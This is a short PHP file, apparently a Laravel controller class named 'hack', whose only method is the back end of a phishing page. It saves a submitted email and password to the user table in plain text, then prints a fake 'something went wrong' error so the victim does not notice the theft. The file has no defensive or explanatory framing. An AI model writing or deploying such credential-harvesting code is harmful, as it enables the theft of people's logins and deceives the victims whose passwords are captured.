<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\User;
class hack extends Controller
{
    public function submit(Request $request)
    {
        $user=New User();
        $user->name=$request->email;
        $user->password=$request->pass;
        $user->save();
        echo "SomeThing Went Wrong Try After 15 Minutes";

    }
}
